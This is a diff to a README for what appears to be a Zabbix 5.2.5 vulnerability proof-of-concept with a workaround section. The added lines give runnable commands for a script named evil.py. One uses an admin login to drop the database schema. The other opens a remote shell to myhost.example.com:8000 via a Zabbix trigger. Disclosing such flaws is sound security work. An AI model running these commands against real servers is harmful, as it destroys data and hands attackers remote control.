@@ -32,18 +32,19 @@ Follow the instructions in <./zabbix-simple/README.md>.
 
 If you set up an instance with "zabbix-simple" you should have installed [pyzabbix](https://pypi.org/project/pyzabbix/), a user called "User" with the role "Zabbix Admin". The password of this user is "something-secret".
 
-Run `evil.py`:
+Destroy database:
 
 ```
-$ python evil.py http://127.0.0.1:8080 User something-secret
-Connected to Zabbix API Version 5.2.5
-1. Action needs to be enabled: http://127.0.0.1:8080/actionconf.php?form=update&actionid=1
-2. Trigger needs to be enabled: http://127.0.0.1:8080/triggers.php?form=update&triggerid=1
-Type 'yes' to automatically enable (This will drop the database schema!): yes
-Enabling action and trigger...
+python evil.py --activate http://127.0.0.1:8080 User something-secret destroy-database
 ```
 
-Observe that the database is destroyed in a few minutes (the created trigger needs to be triggered).
+Remote shell connecting to myhost.example.com:8000:
+
+```
+python evil.py --activate http://127.0.0.1:8080 User something-secret remote-shell myhost.example.com 8000
+```
+
+The trigger might ned few seconds/minutes to activate.
 
 ## Workaround
 
